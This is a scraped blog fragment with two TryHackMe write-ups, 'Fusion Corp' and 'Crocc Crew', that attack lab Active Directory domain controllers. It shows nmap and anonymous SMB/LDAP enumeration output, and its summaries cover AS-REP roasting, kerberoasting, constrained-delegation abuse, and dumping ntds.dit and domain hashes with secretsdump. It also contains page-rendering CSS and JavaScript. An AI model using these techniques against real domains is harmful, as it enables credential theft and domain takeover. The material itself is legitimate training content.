syn-ack ttl 125 Microsoft Windows RPC 139/tcp open netbios-ssn syn-ack ttl 125 Microsoft Windows netbios-ssn 389/tcp open ldap syn-ack ttl 125 Microsoft Windows Active Directory LDAP (Domain: fusion.corp0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? syn-ack ttl 125 464/tcp open kpasswd5? syn-ack ttl 125 593/tcp open ncacn_http syn-ack ttl 125 Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped syn-ack ttl 125 3268/tcp open ldap syn-ack ttl 125 Microsoft Windows Active Directory LDAP (Domain: fusion.corp0., Site: Default-First-Site-Name) 3269/tcp open tcpwrapped syn-ack ttl 125 3389/tcp open ms-wbt-server syn-ack ttl 125 Microsoft Terminal Services | rdp-ntlm-info: | Target_Name: FUSION | NetBIOS_Domain_Name: FUSION | NetBIOS_Computer_Name: FUSION-DC | DNS_Domain_Name: fusion.corp | DNS_Computer_Name: Fusion-DC.fusion.corp | Product_Version: 10.0.17763 |_ System_Time: 2025-07-10T20:24:27+00:00 | ssl-cert: Subject: commonName=Fusion-DC.fusion.corp | Issuer: commonName=Fusion-DC.fusion.corp | Public Key type: rsa | Public Key bits: 2048 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2025-07-09T20:23:17 | Not valid after: 2026-01-08T20:23:17 | MD5: 9bb5:816c:19a4:ded2:25ce:fadf:aa7c:6862 | SHA-1: 97a5:6d31:335b:799f:32c3:ca9b:4a99:c8c7:8c23:92a5 | -----BEGIN CERTIFICATE----- | MIIC7jCCAdagAwIBAgIQcRL/M8rGsoBMcOvpYGK3CTANBgkqhkiG9w0BAQsFADAg | MR4wHAYDVQQDExVGdXNpb24tREMuZnVzaW9uLmNvcnAwHhcNMjUwNzA5MjAyMzE3 | WhcNMjYwMTA4MjAyMzE3WjAgMR4wHAYDVQQDExVGdXNpb24tREMuZnVzaW9uLmNv | cnAwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDpAnEjtv/u25XgKvVm | I9NWSgdwdJLwtgC9oLMZQcEwhZ2hWNYMhHsaf7JC1NYxUW4k5wf2bpsCkx7hLZs2 | aaVGnAjNoBMznkfIu/goDkkFRA7IwW7vzFOs6Wqc+sxRYcJvcZWaq/hXtUoam85l | TNhYUFrfjATkhgPpqGKUi0WBVqfw/Gcdt3KIlvTAauY3q2Ft6YtL+A4S+QgEYF6N | qMnJ2kODWuCKRwqqUEX6d4/DTUXoAQIgGZzudi/WYVOkg39dd2LT0DS7wiRZydr5 | XGr9+ge71mf9yk5ge6JHEdFgEJayAukksHtK97tziuoLmCANLt7b+bZL++1VpFCu | 6LJhAgMBAAGjJDAiMBMGA1UdJQQMMAoGCCsGAQUFBwMBMAsGA1UdDwQEAwIEMDAN | BgkqhkiG9w0BAQsFAAOCAQEAKZv4p8/eX82nKg7TCL9N5XfJ44BpBtPIHqghEYS+ | FxzjdKVUgxbdod8Rb6Wqoq6f3lw81mYhG3vixEkcQmEtp10gScWbdScTV+EB0J2C | bZCUBZus8m4HdD+BGbWW61/k6iF0hdTJUvvb3kyWn4Ed6Y79bvXkKjuEmEgvJcmD | iFjmhQYH+eMrwaWPCsSLYcHAzh9OoVQZHx5n7HNNAb2rvFBywUYTS7StQQZTl3v0 | CaMeZlmiyOvzxqjsrE/CkVA3Xgk04P7vrlv0Vqn3Ka29FpdVuluLQMN64OpnYVEA | XLC+kuRLfSVxyBK4z64aNa/MDvCKv2m58U4kzXo/DSZqAw== |_-----END CERTIFICATE----- |_ssl-date: 2025-07-10T20:25:06+00:00; 0s from scanner time. Service Info: Host: FUSION-DC; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required |_clock-skew: mean: 0s, deviation: 0s, median: 0s | p2p-conficker: | Checking for Conficker.C or higher... | Check 1 (port 14125/tcp): CLEAN (Timeout) | Check 2 (port 14414/tcp): CLEAN (Timeout) | Check 3 (port 42015/udp): CLEAN (Timeout) | Check 4 (port 12722/udp): CLEAN (Timeout) |_ 0/4 checks are positive: Host is CLEAN or ports are blocked | smb2-time: | date: 2025-07-10T20:24:27 |_ start_date: N/A Read data files from: /usr/share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Thu Jul 10 16:25:10 2025 -- 1 IP address (1 host up) scanned in 69.56 seconds copy The scan reveals common ports for an Active Directory environment. The rdp-ntlm-info NSE script gives us the domain name (fusion.corp), the hostname (FUSION-DC), and the FQDN (Fusion-DC.fusion.corp). Port 80 is also open.\nLet\u0026rsquo;s add that to our hosts file: 0xblivion@fusionCorp: ~ root@localhost:~# echo \"10.10.27.194 Fusion-DC.fusion.corp FUSION-DC fusion.corp\" | sudo tee -a /etc/hosts 10.10.27.194 Fusion-DC.fusion.corp FUSION-DC fusion.corp copy Note: You should put the FQDN first before anything else, to avoid any DNS issues. (That\u0026rsquo;s what I learn on the previous writeup Crocc Crew) 1.2. Anonymous Authentication Checks Without credentials, we can\u0026rsquo;t do anything. So let\u0026rsquo;s try basic unauthenticated checks first before diving into the web stuff. First, I will try smb null authentication:\n0xblivion@fusionCorp: ~ root@localhost:~# nxc smb $target -u '' -p '' --shares SMB 10.10.27.194 445 FUSION-DC [*] Windows 10 / Server 2019 Build 17763 x64 (name:FUSION-DC) (domain:fusion.corp) (signing:True) (SMBv1:False) SMB 10.10.27.194 445 FUSION-DC [+] fusion.corp\\: SMB 10.10.27.194 445 FUSION-DC [-] Error enumerating shares: STATUS_ACCESS_DENIED copy We can authenticate but we can\u0026rsquo;t list the shares. Next, I\u0026rsquo;ll try an anonymous bind against LDAP to see if I can dump any information about the domain structure:\n0xblivion@fusionCorp: ~ root@localhost:~# ldapsearch -x -H ldap://$target -s base namingcontexts # extended LDIF # # LDAPv3 # base \u003c\u003e (default) with scope baseObject # filter: (objectclass=*) # requesting: namingcontexts # # dn: namingcontexts: DC=fusion,DC=corp namingcontexts: CN=Configuration,DC=fusion,DC=corp namingcontexts: CN=Schema,CN=Configuration,DC=fusion,DC=corp namingcontexts: DC=DomainDnsZones,DC=fusion,DC=corp namingcontexts: DC=ForestDnsZones,DC=fusion,DC=corp # search result search: 2 result: 0 Success # numResponses: 2 # numEntries: 1 root@localhost:~# ldapsearch -x -H ldap://$target -b 'DC=fusion,DC=corp' # extended LDIF # # LDAPv3 # base ","permalink":"https://0xblivion.dev/posts/thm/windows/hard/tryhackme-fusion-corp-writeup/","summary":"\u003ch1 id=\"overview\"\u003eOverview\u003c/h1\u003e\n\u003cp\u003e\u003cimg src=\"/img/FusionCorp/Fusion.png\" alt=\"\" class=\"img-responsive\" loading=\"lazy\" /\u003e\n\u003ccode\u003eFusion corp\u003c/code\u003e is a hard rated box on tryhackme. After some basic enumeration fails, we find a backup file on the web server that contains a list of usernames. One of these users, \u003ccode\u003elparker\u003c/code\u003e, is vulnerable to AS-REP Roasting because they have Kerberos pre-authentication disabled. We get their hash, crack it, and get a shell on the box.\u003c/p\u003e\n\u003cp\u003eFrom there, post-exploitation enumeration reveals another user, \u003ccode\u003ejmurphy\u003c/code\u003e, with their password stored in the user account\u0026rsquo;s comment field. This user is a member of the \u003ccode\u003eBackup Operators\u003c/code\u003e group. We abuse this privilege to create a shadow copy of the C: drive and exfiltrate the \u003ccode\u003entds.dit\u003c/code\u003e and \u003ccode\u003eSYSTEM\u003c/code\u003e hives. Finally, we use \u003ccode\u003esecretsdump.py\u003c/code\u003e to dump all the domain hashes, get the administrator\u0026rsquo;s hash, and use it to get the final flag.\u003c/p\u003e","title":"TryHackMe - Fusion Corp WriteUp"},{"content":"Overview Crocc Crew is an insane machine on TryHackMe, but it\u0026rsquo;s kinda like a easy box. The path starts with some clever RDP reconnaissance to find initial credentials. From there, it involves kerberoasting a service account, diving into BloodHound to find a constrained delegation path, and wrestling with a very frustrating secretsdump error that I almost rage quit and touched grass. Let’s walk through it.\nTarget IP 10.10.208.147 + − ⌂ [https://i.ibb.co/JjzkJ3NR/user-removebg-preview.png]Nmap Scan [https://i.ibb.co/LzdxQFPv/computer-removebg-preview.png]Bypass RDP NLA → Spot Sticky Note → Visitor:GuestLogin! [https://i.ibb.co/Kckn13Nh/database-removebg-preview.png]Enumerate SMB → Home Share → Get User Flag [https://i.ibb.co/Gwv4v4g/shell-exploit-removebg-preview.png]Kerberoast password-reset → Crack with Hashcat [https://i.ibb.co/JR4shsmH/login-removebg-preview.png]Login as password-reset → Run BloodHound [https://i.ibb.co/Gwv4v4g/shell-exploit-removebg-preview.png]Find Constrained Delegation to oakley/DC [https://i.ibb.co/0ybfPw9J/password-removebg-preview.png]Use getST.py to impersonate Administrator [https://i.ibb.co/LzdxQFPv/computer-removebg-preview.png]Fix /etc/hosts → Run secretsdump [https://i.ibb.co/JR4shsmH/login-removebg-preview.png]Evil-WinRM as Administrator [https://i.ibb.co/679DN5x7/rooted-removebg-preview.png]LDAPSearch → Identify Planted 1. Initial Access (TA0001) As always, the first step is a thorough nmap scan to see what we\u0026rsquo;re working with.\n0xblivion@crocccrew: ~ root@localhost:~# sudo nmap -sVC -oA nmap/crocccew.nmap -vv 10.10.208.147 # Nmap 7.95 scan initiated Tue Jul 8 22:57:20 2025 as: /usr/lib/nmap/nmap -sVC -oA nmap/crocccew -vv 10.10.208.147 Nmap scan report for 10.10.232.56 Host is up, received echo-reply ttl 125 (0.12s latency). Scanned at 2025-07-08 22:57:20 EDT for 66s Not shown: 989 filtered tcp ports (no-response) PORT STATE SERVICE REASON VERSION 53/tcp open domain syn-ack ttl 125 Simple DNS Plus 80/tcp open http syn-ack ttl 125 Microsoft IIS httpd 10.0 |_http-server-header: Microsoft-IIS/10.0 | http-methods: | Supported Methods: OPTIONS TRACE GET HEAD POST |_ Potentially risky methods: TRACE 88/tcp open kerberos-sec syn-ack ttl 125 Microsoft Windows Kerberos (server time: 2025-07-09 02:57:35Z) 135/tcp open msrpc syn-ack ttl 125 Microsoft Windows RPC 139/tcp open netbios-ssn syn-ack ttl 125 Microsoft Windows netbios-ssn 389/tcp open ldap syn-ack ttl 125 Microsoft Windows Active Directory LDAP (Domain: COOCTUS.CORP0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? syn-ack ttl 125 464/tcp open kpasswd5? syn-ack ttl 125 593/tcp open ncacn_http syn-ack ttl 125 Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped syn-ack ttl 125 3389/tcp open ms-wbt-server syn-ack ttl 125 Microsoft Terminal Services | ssl-cert: Subject: commonName=DC.COOCTUS.CORP | Issuer: commonName=DC.COOCTUS.CORP | Public Key type: rsa | Public Key bits: 2048 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2025-07-08T02:57:02 | Not valid after: 2026-01-07T02:57:02 | MD5: 78dc:192b:b5b8:8825:8fc8:694a:0347:7704 | SHA-1: a413:afa5:27c4:a5bf:4418:f49c:cf20:b0b6:e312:7561 | -----BEGIN CERTIFICATE----- | MIIC4jCCAcqgAwIBAgIQUedVsKPVb7FAziU1B3KpMzANBgkqhkiG9w0BAQsFADAa | MRgwFgYDVQQDEw9EQy5DT09DVFVTLkNPUlAwHhcNMjUwNzA4MDI1NzAyWhcNMjYw | MTA3MDI1NzAyWjAaMRgwFgYDVQQDEw9EQy5DT09DVFVTLkNPUlAwggEiMA0GCSqG | SIb3DQEBAQUAA4IBDwAwggEKAoIBAQCwriWZOi4e7FNBmyqXt4U3dZwT4AtJ0Nd7 | 4kBUyj6W9nolkMit/WmQfY5fdPm8hYYD7v9EuENfOaIUDuJ+58EBqHqVa1MEvKtK | N72oHiVGmIXfHpSFgkSbwktt1oye5J7SDPtlLqr+21RaTpvQE67VZnb78tqvflhy | eks7EieAsQ10CK2SRR1JDclJUns5ibJv6htsP6D0rmJ4sF+VLCdXIh2A7QvHk3qD | cWsIBUlUgct2wmxrPpiClt9lU0YnIUqL0MOGSt+TyK7JfNLEtdwD/PEuKYriY8Kf | x1KDfB9ZYZ7sv+u22csEcLu/337TrE5XRiwPM4xqo6DvEOZPgDe5AgMBAAGjJDAi | MBMGA1UdJQQMMAoGCCsGAQUFBwMBMAsGA1UdDwQEAwIEMDANBgkqhkiG9w0BAQsF | AAOCAQEANW4kPq2xALqBFsfbqAoeCph6qIwwpRr78Iy700Nx4m0UgLrHSFrZ9M2Q | KnMQfregVusen0Zkk9QdgNn/nTKgNqO/lQNrUpL2RE6jadnSrMEucXAaTY9m3ph7 | Ty5TwPWgX6EAlSfnFO1FQoVM+sNWEF68akQeGSUESsHW0DWmaNrbdTYd+sy2/CZr | EfVEVQMMNhHWVR4rHEvRf/B5P2VERAMdRTtgUUe6Ysw0r0osZ1fa+mfU+rPO0wjv | mfTwL7PKicvIvA4Ljlh9h6FizzWMIvr5lRK3Dxm66hHuyduQCfI/+vsn+KejlKLy | fM6uyRPAZQ8pf7KWGiddXmlm/7X5gw== |_-----END CERTIFICATE----- | rdp-ntlm-info: | Target_Name: COOCTUS | NetBIOS_Domain_Name: COOCTUS | NetBIOS_Computer_Name: DC | DNS_Domain_Name: COOCTUS.CORP | DNS_Computer_Name: DC.COOCTUS.CORP | Product_Version: 10.0.17763 |_ System_Time: 2025-07-09T02:57:43+00:00 |_ssl-date: 2025-07-09T02:58:22+00:00; -2s from scanner time. Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | p2p-conficker: | Checking for Conficker.C or higher... | Check 1 (port 65000/tcp): CLEAN (Timeout) | Check 2 (port 48223/tcp): CLEAN (Timeout) | Check 3 (port 18913/udp): CLEAN (Timeout) | Check 4 (port 21237/udp): CLEAN (Timeout) |_ 0/4 checks are positive: Host is CLEAN or ports are blocked | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required |_clock-skew: mean: -1s, deviation: 0s, median: -1s | smb2-time: | date: 2025-07-09T02:57:46 |_ start_date: N/A Read data files from: /usr/share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Tue Jul 8 22:58:26 2025 -- 1 IP address (1 host up) scanned in 65.91 seconds copy The scan results clearly point to a Windows Domain Controller for the COOCTUS.CORP domain. We have all the standard AD ports (Kerberos, LDAP, SMB) plus RDP on port 3389. I added the relevant hostnames to my /etc/hosts file to ensure proper name resolution.\n0xblivion@crocccrew: ~ root@localhost:~# echo '10.10.208.147 dc dc.cooctus.corp cooctus.corp' | sudo tee -a /etc/hosts copy Anonymous Enumeration (T1087) Without any credentials, I started with some unauthenticated enumeration to see what I could find. First, an anonymous SMB login to check for readable shares.\n0xblivion@crocccrew: ~ root@localhost:~# nxc smb $target -u '' -p '' --shares SMB 10.10.208.147 445 DC [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:COOCTUS.CORP) (signing:True) (SMBv1:False) SMB 10.10.208.147 445 DC [+] COOCTUS.CORP\\: SMB 10.10.208.147 445 DC [-] Error enumerating shares: STATUS_ACCESS_DENIED copy I could authenticate as an anonymous user, but didn\u0026rsquo;t have permissions to list the shares. Next, I tried an anonymous LDAP bind to see if I could dump any information about the domain structure.\n0xblivion@crocccrew: ~ root@localhost:~# ldapsearch -x -H ldap://$target -s base namingcontexts # extended LDIF # # LDAPv3 # base \u003c\u003e (default) with scope baseObject # filter: (objectclass=*) # requesting: namingcontexts # # dn: namingcontexts: DC=COOCTUS,DC=CORP namingcontexts: CN=Configuration,DC=COOCTUS,DC=CORP namingcontexts: CN=Schema,CN=Configuration,DC=COOCTUS,DC=CORP namingcontexts: DC=DomainDnsZones,DC=COOCTUS,DC=CORP namingcontexts: DC=ForestDnsZones,DC=COOCTUS,DC=CORP # search result search: 2 result: 0 Success # numResponses: 2 # numEntries: 1 root@localhost:~# ldapsearch -x -H ldap://$target -b 'DC=COOCTUS,DC=CORP' # extended LDIF # # LDAPv3 # base ","permalink":"https://0xblivion.dev/posts/thm/windows/insane/tryhackme-crocc-crew-writeup/","summary":"\u003ch1 id=\"overview\"\u003eOverview\u003c/h1\u003e\n\u003cimg src=\"/img/croccCrew/crocc.png\" alt=\"\" class=\"img-responsive\" loading=\"lazy\" /\u003e\n\u003cp\u003e\u003ccode\u003eCrocc Crew\u003c/code\u003e is an insane machine on \u003ca href=\"http://tryhackme.com/\"\u003eTryHackMe\u003c/a\u003e, but it\u0026rsquo;s kinda like a easy box. The path starts with some clever RDP reconnaissance to find initial credentials. From there, it involves kerberoasting a service account, diving into BloodHound to find a constrained delegation path, and wrestling with a very frustrating \u003ccode\u003esecretsdump\u003c/code\u003e error that I almost rage quit and touched grass. Let’s walk through it.\u003c/p\u003e\n\n\u003cdiv class=\"target-info\"\u003e\n    \u003cdiv class=\"target-icon\"\u003e\n        \u003csvg viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\"\u003e\n            \u003ccircle cx=\"12\" cy=\"12\" r=\"10\"/\u003e\n            \u003ccircle cx=\"12\" cy=\"12\" r=\"6\"/\u003e\n            \u003ccircle cx=\"12\" cy=\"12\" r=\"2\"/\u003e\n        \u003c/svg\u003e\n    \u003c/div\u003e\n    \u003cdiv class=\"target-details\"\u003e\n        \u003cdiv class=\"target-item\"\u003e\n            \u003cspan class=\"target-label\"\u003eTarget IP\u003c/span\u003e\n            \u003ccode class=\"ip-address\"\u003e10.10.208.147\u003c/code\u003e\n        \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cstyle\u003e\n.target-info {\n    display: flex;\n    align-items: center;\n    gap: 12px;\n    padding: 12px 16px;\n    margin: 16px 0;\n    background: linear-gradient(135deg, #0d1117 0%, #161b22 100%);\n    border-left: 4px solid #9fef00;\n    border-radius: 8px;\n    font-family: system-ui, -apple-system, sans-serif;\n}\n\n.target-icon {\n    flex-shrink: 0;\n}\n\n.target-icon svg {\n    width: 20px;\n    height: 20px;\n    color: #9fef00;\n    display: block;\n}\n\n.target-details {\n    flex: 1;\n    display: flex;\n    align-items: center;\n    gap: 16px;\n}\n\n.target-item {\n    display: flex;\n    align-items: center;\n    gap: 8px;\n}\n\n.creds-separator {\n    flex-shrink: 0;\n    opacity: 1;\n}\n\n.creds-separator svg {\n    width: 18px;\n    height: 18px;\n    color: #9fef00;\n    display: block;\n    stroke-width: 2.5;\n}\n\n.target-label {\n    font-size: 14px;\n    font-weight: 600;\n    color: #c9d1d9;\n    white-space: nowrap;\n}\n\n.ip-address, .credentials {\n    color: #9fef00;\n    font-family: 'Courier New', monospace;\n    font-size: 14px;\n    font-weight: bold;\n    background: none !important;\n    background-color: transparent !important;\n    padding: 0 !important;\n    border: none !important;\n    border-radius: 0 !important;\n}\n\u003c/style\u003e\n\n\n\n\n\n\u003cdiv id=\"flowchart-1752344197973010200\" class=\"attack-path-flowchart\"\u003e\n  \u003cdiv class=\"flowchart-controls\"\u003e\n    \u003cbutton class=\"zoom-btn\" data-action=\"zoom-in\" title=\"Zoom In\"\u003e+\u003c/button\u003e\n    \u003cbutton class=\"zoom-btn\" data-action=\"zoom-out\" title=\"Zoom Out\"\u003e−\u003c/button\u003e\n    \u003cbutton class=\"zoom-btn\" data-action=\"reset\" title=\"Reset View\"\u003e⌂\u003c/button\u003e\n  \u003c/div\u003e\n  \u003cdiv class=\"flowchart-data\" style=\"display: none;\"\u003e\n[https://i.ibb.co/JjzkJ3NR/user-removebg-preview.png]Nmap Scan\n[https://i.ibb.co/LzdxQFPv/computer-removebg-preview.png]Bypass RDP NLA → Spot Sticky Note → Visitor:GuestLogin!  \n[https://i.ibb.co/Kckn13Nh/database-removebg-preview.png]Enumerate SMB → Home Share → Get User Flag  \n[https://i.ibb.co/Gwv4v4g/shell-exploit-removebg-preview.png]Kerberoast password-reset → Crack with Hashcat  \n[https://i.ibb.co/JR4shsmH/login-removebg-preview.png]Login as password-reset → Run BloodHound  \n[https://i.ibb.co/Gwv4v4g/shell-exploit-removebg-preview.png]Find Constrained Delegation to oakley/DC  \n[https://i.ibb.co/0ybfPw9J/password-removebg-preview.png]Use getST.py to impersonate Administrator  \n[https://i.ibb.co/LzdxQFPv/computer-removebg-preview.png]Fix /etc/hosts → Run secretsdump  \n[https://i.ibb.co/JR4shsmH/login-removebg-preview.png]Evil-WinRM as Administrator  \n[https://i.ibb.co/679DN5x7/rooted-removebg-preview.png]LDAPSearch → Identify Planted\n\u003c/div\u003e\n\u003c/div\u003e\n\n\n\n\u003cstyle\u003e\n.attack-path-flowchart {\n  width: 100%;\n  height: 500px;\n  background: transparent;\n  border: 1px solid rgba(255, 255, 255, 0.1);\n  border-radius: 8px;\n  position: relative;\n  overflow: hidden;\n  margin: 2rem 0;\n}\n\n.flowchart-controls {\n  position: absolute;\n  top: 10px;\n  right: 10px;\n  z-index: 1000;\n  display: flex;\n  gap: 5px;\n}\n\n.zoom-btn {\n  width: 32px;\n  height: 32px;\n  background: rgba(0, 0, 0, 0.7);\n  border: 1px solid rgba(255, 255, 255, 0.2);\n  border-radius: 4px;\n  color: #fff;\n  font-size: 16px;\n  font-weight: bold;\n  cursor: pointer;\n  display: flex;\n  align-items: center;\n  justify-content: center;\n  transition: all 0.2s ease;\n}\n\n.zoom-btn:hover {\n  background: rgba(0, 0, 0, 0.9);\n  border-color: rgba(255, 255, 255, 0.4);\n}\n\n.flowchart-svg {\n  width: 100%;\n  height: 100%;\n  background: transparent;\n  cursor: grab;\n}\n\n.flowchart-svg:active {\n  cursor: grabbing;\n}\n\n.flowchart-node {\n  cursor: pointer;\n}\n\n.flowchart-icon {\n  font-family: 'Font Awesome 6 Free', 'Font Awesome 6 Solid', sans-serif;\n  font-weight: 900;\n  font-size: 36px;\n  text-anchor: middle;\n  dominant-baseline: central;\n  transition: all 0.3s ease;\n  filter: drop-shadow(0 2px 8px rgba(0, 0, 0, 0.6));\n}\n\n.flowchart-image {\n  transition: all 0.3s ease;\n  filter: drop-shadow(0 2px 8px rgba(0, 0, 0, 0.6));\n}\n\n.flowchart-text {\n  font-family: 'Courier New', 'Monaco', 'Consolas', monospace;\n  font-size: 10px;\n  font-weight: 600;\n  text-anchor: middle;\n  pointer-events: none;\n  user-select: none;\n  fill: #ddd;\n}\n\n.flowchart-arrow {\n  stroke: rgba(255, 255, 255, 0.4);\n  stroke-width: 1.5px;\n  transition: all 0.2s ease-in-out;\n}\n\n.flowchart-arrow.glow {\n  stroke: rgba(255, 255, 255, 1);\n  stroke-width: 2.5px;\n  filter: drop-shadow(0 0 4px rgba(255, 255, 255, 0.7));\n}\n\n.flowchart-arrow-marker {\n  fill: rgba(255, 255, 255, 0.6);\n}\n\n.flowchart-pin-icon {\n  font-family: 'Font Awesome 6 Free', 'Font Awesome 6 Solid', sans-serif;\n  font-weight: 900;\n  font-size: 16px;\n  fill: #DC143C;  \n  text-anchor: middle;\n  dominant-baseline: central;\n  display: none;  \n  pointer-events: none;\n  filter: drop-shadow(0 1px 2px rgba(0,0,0,0.7));\n}\n\n\n \n.node-recon .flowchart-icon { color: #A0522D; }  \n.node-enum .flowchart-icon { color: #4169E1; }  \n.node-exploit .flowchart-icon { color: #DC143C; }  \n.node-access .flowchart-icon { color: #2E8B57; }  \n.node-privesc .flowchart-icon { color: #FF8C00; }  \n.node-root .flowchart-icon { color: #FFD700; }  \n.node-default .flowchart-icon { color: #A9A9A9; }  \n\u003c/style\u003e\n\n\u003cscript\u003e\n(function() {\n  \n  \"use strict\";\n\n  let flowchartInstances = {};\n\n  const iconMap = {\n    recon: '\\uf002', enum: '\\uf0ca', exploit: '\\uf1e2',\n    access: '\\uf084', privesc: '\\uf21b', root: '\\uf624', default: '\\uf059',\n    pin: '\\uf08d',\n  };\n\n  function initFlowcharts() {\n    const containers = document.querySelectorAll('.attack-path-flowchart');\n    containers.forEach(container =\u003e {\n      if (container.dataset.initialized) return;\n      container.dataset.initialized = 'true';\n\n      const id = container.id;\n      const dataDiv = container.querySelector('.flowchart-data');\n      if (dataDiv) {\n        const steps = parseSteps(dataDiv.textContent);\n        if (steps.length \u003e 0) {\n          flowchartInstances[id] = createInteractiveFlowchart(container, steps);\n          setupControls(container, id);\n        }\n      }\n    });\n  }\n\n  function setupControls(container, id) {\n    const instance = flowchartInstances[id];\n    if (!instance) return;\n    container.querySelectorAll('.zoom-btn').forEach(btn =\u003e {\n      btn.addEventListener('click', () =\u003e {\n        const action = btn.getAttribute('data-action');\n        if (action === 'zoom-in') {\n            instance.svg.transition().ease(d3.easeCubicOut).duration(500).call(instance.zoom.scaleBy, 1.2);\n        } else if (action === 'zoom-out') {\n            instance.svg.transition().ease(d3.easeCubicOut).duration(500).call(instance.zoom.scaleBy, 1 / 1.2);\n        } else if (action === 'reset') {\n          instance.svg.transition().ease(d3.easeCubicOut).duration(750).call(instance.zoom.transform, d3.zoomIdentity);\n        }\n      });\n    });\n  }\n\n  function parseSteps(content) {\n    return content.split('\\n').map(l =\u003e l.trim()).filter(Boolean).map((line, idx) =\u003e {\n      line = line.replace(/^[-*]\\s*/, '');\n      const imgRe = /\\[\\s*([^\\]]+?)\\s*\\]\\s*(.*)/;\n      const match = line.match(imgRe);\n      const text = match ? match[2].trim() : line;\n      return { id: idx, text, type: getStepType(text), imageUrl: match ? match[1] : null, pinned: false };\n    });\n  }\n\n  function getStepType(text) {\n    const l = text.toLowerCase();\n    if (l.includes('nmap') || l.includes('scan') || l.includes('recon')) return 'recon';\n    if (l.includes('enum') || l.includes('directory') || l.includes('subdomain') || l.includes('git') || l.includes('dump') || l.includes('crawl')) return 'enum';\n    if (l.includes('exploit') || l.includes('rce') || l.includes('sqli') || l.includes('xss') || l.includes('lfi') || l.includes('upload') || l.includes('injection')) return 'exploit';\n    if (l.includes('shell') || l.includes('reverse') || l.includes('bind') || l.includes('webshell')) return 'access';\n    if (l.includes('privesc') || l.includes('privilege') || l.includes('escalation') || l.includes('sudo') || l.includes('suid') || l.includes('kernel') || l.includes('creds')) return 'privesc';\n    if (l.includes('root') || l.includes('administrator') || l.includes('system') || l.includes('sudo bee')) return 'root';\n    return 'default';\n  }\n\n  function createInteractiveFlowchart(container, nodesData) {\n    const W = container.clientWidth, H = container.clientHeight;\n    const svg = d3.select(container).append('svg')\n                  .attr('class','flowchart-svg').attr('width',W).attr('height',H);\n\n    const zoom = d3.zoom().duration(500).scaleExtent([0.1, 5]).on('zoom', e =\u003e g.attr('transform', e.transform));\n\n    svg.call(zoom);\n    const g = svg.append('g');\n\n    const defs = svg.append('defs');\n    defs.append('marker')\n        .attr('id','arrowhead').attr('viewBox','-0 -5 10 10')\n        .attr('refX', 25).attr('refY', 0)\n        .attr('orient','auto').attr('markerWidth', 5).attr('markerHeight', 5)\n      .append('path').attr('d', 'M0,-5L10,0L0,5').attr('class','flowchart-arrow-marker');\n\n    const links = nodesData.length \u003e 1 ? d3.range(nodesData.length - 1).map(i =\u003e ({ source: nodesData[i], target: nodesData[i+1] })) : [];\n\n    const arrows = g.append(\"g\").selectAll(\"line\")\n      .data(links).enter().append(\"line\")\n      .attr(\"class\", \"flowchart-arrow\")\n      .attr(\"marker-end\", \"url(#arrowhead)\");\n\n    const nodeGroups = g.append(\"g\").selectAll(\".flowchart-node\")\n      .data(nodesData, d =\u003e d.id).enter().append(\"g\")\n      .attr(\"class\", d =\u003e 'flowchart-node node-' + d.type);\n\n    nodeGroups.each(function(d) {\n      const node = d3.select(this);\n      if (d.imageUrl) {\n        node.append('image')\n          .attr('href', d.imageUrl).attr('class', 'flowchart-image')\n          .attr('x', -20).attr('y', -25).attr('width', 40).attr('height', 40)\n          .on('error', function() {\n            d3.select(this.parentNode).append('text').attr('class', 'flowchart-icon').attr('y', -5).text(iconMap['default']);\n            d3.select(this).remove();\n          });\n      } else {\n        node.append('text').attr('class', 'flowchart-icon').attr('y', -5).text(iconMap[d.type] || iconMap['default']);\n      }\n    });\n\n    nodeGroups.append('text')\n      .attr('class', 'flowchart-pin-icon')\n      .attr('x', 20)\n      .attr('y', -20)\n      .text(iconMap.pin);\n\n    nodeGroups.append('text').attr('class', 'flowchart-text').attr('y', 35)\n      .each(function(d) { wrapText(d3.select(this), d.text, 100); });\n    nodeGroups.append('title').text(d =\u003e d.text);\n\n    const numNodes = nodesData.length;\n    const padding = 120;\n    const nodeRadius = 40;\n\n    const linkForce = d3.forceLink(links).id(d =\u003e d.id).distance(150).strength(0.2);\n\n    const simulation = d3.forceSimulation(nodesData)\n        .force(\"link\", linkForce)\n        .force(\"charge\", d3.forceManyBody().strength(-600))\n        .force(\"collide\", d3.forceCollide().radius(nodeRadius).strength(1))\n        .force(\"x\", d3.forceX(d =\u003e {\n            if (numNodes \u003c= 1) return W / 2;\n            return padding + (d.id / (numNodes - 1)) * (W - 2 * padding);\n        }).strength(0.4))\n        .force(\"y\", d3.forceY(d =\u003e {\n            if (numNodes \u003c= 1) return H / 2;\n            const amplitude = H * 0.20;\n            const frequency = Math.PI;\n            const centerY = H / 2;\n            const phase = (d.id / (numNodes - 1)) * frequency;\n            return centerY - amplitude * Math.cos(phase);\n        }).strength(0.5))\n        .on(\"tick\", () =\u003e {\n          arrows\n              .attr(\"x1\", d =\u003e d.source.x)\n              .attr(\"y1\", d =\u003e d.source.y)\n              .attr(\"x2\", d =\u003e d.target.x)\n              .attr(\"y2\", d =\u003e d.target.y);\n          nodeGroups\n              .attr(\"transform\", d =\u003e `translate(${d.x},${d.y})`);\n        });\n\n    const dragHandler = d3.drag()\n        .on(\"start\", function (event, d) {\n            if (!event.active) simulation.alphaTarget(0.3).restart();\n            d.fx = d.x;\n            d.fy = d.y;\n            \n            arrows.filter(link =\u003e link.source.id === d.id).classed('glow', true);\n            linkForce.strength(0); \n        })\n        .on(\"drag\", function (event, d) {\n            d.fx = event.x;\n            d.fy = event.y;\n        })\n        .on(\"end\", function (event, d) {\n            if (!event.active) simulation.alphaTarget(0);\n            \n            